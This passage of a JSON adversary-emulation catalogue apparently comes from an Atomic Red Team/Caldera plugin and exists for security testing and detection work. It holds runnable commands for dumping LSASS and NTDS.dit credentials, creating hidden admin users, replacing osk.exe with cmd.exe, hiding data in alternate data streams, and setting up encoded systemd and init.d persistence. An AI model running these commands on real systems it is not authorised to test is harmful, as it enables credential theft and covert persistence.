["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\T1564.004_has_ads_cmd.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt && for /f \"usebackq delims=?\" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: NTFS File Attributes", "ability_id": "53be764b84e99052c6c0099ab4968be5", "technique_id": "T1564.004", "tactic": "defense-evasion", "requirements": [], "name": "Create ADS command prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /f >nul 2>&1 && net user ${user_name}$ /delete >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  && REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Users", "ability_id": "94ada6941f651b12c2a7fbba310a4bde", "technique_id": "T1564.002", "tactic": "defense-evasion", "requirements": [], "name": "Create Hidden User in Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a hidden user on macOS using IsHidden optoin\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo dscl . -delete /Users/APT"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo dscl . -create /Users/APT IsHidden 1", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Users", "ability_id": "8c47e4a4fe7c3e255b062ca1339d11ed", "technique_id": "T1564.002", "tactic": "defense-evasion", "requirements": [], "name": "Create Hidden User using IsHidden option", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo dscl . -delete /Users/APT"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo dscl . -create /Users/APT UniqueID 333", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Users", "ability_id": "e7fed022d1e3befe9ac5dbb086f75363", "technique_id": "T1564.002", "tactic": "defense-evasion", "requirements": [], "name": "Create Hidden User using UniqueID < 500", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "6f0815bd32e08646588c398d0e79ebb3", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Create Mini Dump of LSASS.exe using ProcDump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["takeown /F %windir%\\System32\\osk.exe /A && icacls %windir%\\System32\\osk.exe /grant Administrators:F /t && del %windir%\\System32\\osk.exe && copy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe && icacls %windir%\\system32\\osk.exe /inheritance:d && icacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\" && icacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t && icacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX && icacls %windir%\\system32\\osk.exe /grant:r Administrators:RX"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd ) && takeown /F %windir%\\System32\\osk.exe /A && icacls %windir%\\System32\\osk.exe /grant Administrators:F /t && del %windir%\\System32\\osk.exe && mklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Accessibility Features", "ability_id": "6f6518545b5dd35eecbed18dfa828e8c", "technique_id": "T1546.008", "tactic": "multiple", "requirements": [], "name": "Create Symbolic Link From osk.exe to cmd.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "vssadmin.exe create shadow /for=C: && mklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "f7ea25ca809e576a3b5b5b1e4dd94ea4", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Create Symlink to Volume Shadow Copy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test creates a Systemd service unit file and enables it as a service.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["systemctl stop art-systemd-service.service; systemctl disable art-systemd-service.service; rm -rf /etc/systemd/system/art-systemd-service.service; systemctl daemon-reload"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"[Unit]\" > /etc/systemd/system/art-systemd-service.service; echo \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Service]\" >> /etc/systemd/system/art-systemd-service.service; echo \"Type=simple\"; echo \"ExecStart=/bin/touch /tmp/art-systemd-execstart-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecReload=/bin/touch /tmp/art-systemd-execreload-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStop=/bin/touch /tmp/art-systemd-execstop-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker\" >> /etc/systemd/system/art-systemd-service.service; echo \"\" >> /etc/systemd/system/art-systemd-service.service; echo \"[Install]\" >> /etc/systemd/system/art-systemd-service.service; echo \"WantedBy=default.target\" >> /etc/systemd/system/art-systemd-service.service; systemctl daemon-reload; systemctl enable art-systemd-service.service; systemctl start art-systemd-service.service", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Systemd Service", "ability_id": "7e8dd75577f0fa81b5a9b81ed6eae063", "technique_id": "T1543.002", "tactic": "multiple", "requirements": [], "name": "Create Systemd Service", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["systemctl stop art-timer.timer; systemctl disable art-timer.timer; rm /etc/systemd/system/art-timer.service; rm /etc/systemd/system/art-timer.timer; systemctl daemon-reload"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"[Unit]\" > /etc/systemd/system/art-timer.service; echo \"Description=Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.service; echo \"[Service]\" >> /etc/systemd/system/art-timer.service; echo \"Type=simple\" >> /etc/systemd/system/art-timer.service; echo \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> /etc/systemd/system/art-timer.service; echo \"[Install]\" >> /etc/systemd/system/art-timer.service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/art-timer.service; echo \"[Unit]\" > /etc/systemd/system/art-timer.timer; echo \"Description=Executes Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.timer; echo \"Requires=art-timer.service\" >> /etc/systemd/system/art-timer.timer; echo \"[Timer]\" >> /etc/systemd/system/art-timer.timer; echo \"Unit=art-timer.service\" >> /etc/systemd/system/art-timer.timer; echo \"OnCalendar=*-*-* *:*:00\" >> /etc/systemd/system/art-timer.timer; echo \"[Install]\" >> /etc/systemd/system/art-timer.timer; echo \"WantedBy=timers.target\" >> /etc/systemd/system/art-timer.timer; systemctl start art-timer.timer; systemctl enable art-timer.timer; systemctl daemon-reload", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Systemd Timers", "ability_id": "ec2e99e253e94b51fe6f07f83f29a7ef", "technique_id": "T1053.006", "tactic": "multiple", "requirements": [], "name": "Create Systemd Service and Timer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test creates a systemd service unit file and enables it to autostart on boot. Once service is created and enabled, it also modifies this same service file showcasing both Creation and Modification of system process. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["systemctl stop T1543.002; systemctl disable T1543.002; rm -rf /etc/init.d/T1543.002; systemctl daemon-reload"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then : ; else echo Please run from Ubuntu ,Kali OR CentOS.; fi;  ;  cat > /etc/init.d/T1543.002 << EOF; python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"; EOF; chmod +x /etc/init.d/T1543.002; if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali OR centos\" ; fi ; systemctl enable T1543.002; systemctl start T1543.002; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\" | sudo tee -a /etc/init.d/T1543.002; systemctl daemon-reload; systemctl restart T1543.002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Systemd Service", "ability_id": "b74a2618d5277373529a8eae0e301f80", "technique_id": "T1543.002", "tactic": "multiple", "requirements": [], "name": "Create Systemd Service file,  Enable the service , Modify and Reload the service.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /node:\"localhost\" process call create \"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "053d6505f7c4cf792b0ab2f262dff95a", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Create Volume Shadow Copy remotely (WMI) with esentutl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic /node:\"localhost\" shadowcopy call create Volume=C:\\", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "be6f8d1c9a01d720483c8a5daca1c472", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Create Volume Shadow Copy remotely with WMI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "6dc5c587fd22d65b81a443b7ce065ab1", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Create Volume Shadow Copy with Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic shadowcopy call create Volume=C:\\", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "cf60378dd1bbaccd4e7391c0317da202", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Create Volume Shadow Copy with WMI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "vssadmin.exe create shadow /for=C:", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: NTDS", "ability_id": "6b55240dbd6e02df957284328938fcf6", "technique_id": "T1003.003", "tactic": "credential-access", "requirements": [], "name": "Create Volume Shadow Copy with vssadmin", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /A:H %temp%\\T1564.001.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "attrib.exe +h %temp%\\T1564.001.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "20277ce46ffe7d08083f8b5ca524b317", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Create Windows Hidden File with Attrib", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /A:S %temp%\\T1564.001.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "attrib.exe +s %temp%\\T1564.001.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "84457d914b35ebe7b506e70b66067f6b", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Create Windows System File with Attrib", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creating a user with a username containing \"$\"", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user $ /DELETE 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user $ ATOMIC123! /add /active:yes", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts", "ability_id": "dedfa0a54c9c13ce5714a0dc2e1f5d1a", "technique_id": "T1564", "tactic": "defense-evasion", "requirements": [], "name": "Create a Hidden User Called \"$\"", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "28004c307d9958351c450cb0384efaf9", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "Create a Process using WMI Query and an Encoded Command", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Atomic\")); try { $CleanupClass.Delete() } catch {}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\"Win32_Process\")); $NewClass = $Class.Derive(\"Win32_Atomic\"); $NewClass.Put(); Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Windows Management Instrumentation", "ability_id": "80cda763aa992b775038ce134c892070", "technique_id": "T1047", "tactic": "execution", "requirements": [], "name": "Create a Process using obfuscated Win32_Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a hidden file inside a hidden directory\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /var/tmp/.hidden-directory/"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "mkdir /var/tmp/.hidden-directory; echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -rf /var/tmp/.hidden-directory/"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "mkdir /var/tmp/.hidden-directory; echo \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Hide Artifacts: Hidden Files and Directories", "ability_id": "379509c4b83f252bc779446f0512e936", "technique_id": "T1564.001", "tactic": "defense-evasion", "requirements": [], "name": "Create a hidden file in a hidden directory", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new Domain User using the credentials of the Current User\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["cmd /c \"net user T1136.002_Admin /del >nul 2>&1\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$SamAccountName = 'T1136.002_Admin'; $AccountPassword = ConvertTo-SecureString 'T1136_pass123!' -AsPlainText -Force; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain); $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context); $User.SamAccountName = $SamAccountName; $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword); $User.SetPassword($TempCred.GetNetworkCredential().Password); $User.Enabled = $True; $User.PasswordNotRequired = $False; $User.DisplayName = $SamAccountName; $User.Save(); $User", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Create Account: Domain Account", "ability_id": "8a95e17c084e9a8bf41c69c73beeb0af", "technique_id": "T1136.002", "tactic": "persistence", "requirements": [], "name": "Create a new Domain Account using PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new admin user in a command prompt.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user /del \"T1136.001_Admin\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user /add \"#{username}\" \"#{password}\" && net localgroup administrators \"#{username}\" /add", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create Account: Local Account", "ability_id": "5ceb5fd63b2cea41b66395f610aed024", "technique_id": "T1136.001", "tactic": "persistence", "requirements": [], "name": "Create a new Windows admin user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new domain admin user in a command prompt.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user \"T1136.002_Admin\" >nul 2>&1 /del /domain"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user \"#{username}\" \"#{password}\" /add /domain && net group \"#{group}\" \"#{username}\" /add /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create Account: Domain Account", "ability_id": "c6bf167afe0b85a1e88127fc0d093e4d", "technique_id": "T1136.002", "tactic": "persistence", "requirements": [], "name": "Create a new Windows domain admin user", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user \"ANONYMOUS  LOGON\" >nul 2>&1 /del /domain"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user \"ANONYMOUS  LOGON\" \"T1136_pass123!\" /add /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create Account: Domain Account", "ability_id": "b563c36cff8c0a66194dd5a4f1daa1be", "technique_id": "T1136.002", "tactic": "persistence", "requirements": [], "name": "Create a new account similar to ANONYMOUS LOGON", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d97818_AtomicTest.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["net stop w32time; reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f; rm -force C:\\Users\\Public\\AtomicTest.dll; net start w32time"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net stop w32time; Copy-Item d97818_AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Time Providers", "ability_id": "c13fdd68cb4b40650f00e5451ffde021", "technique_id": "T1547.003", "tactic": "multiple", "requirements": [], "name": "Create a new time provider", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "root"}]}], "cleanup": ["userdel butter"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd -g 0 -M -d /root -s /bin/bash butter; if [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo 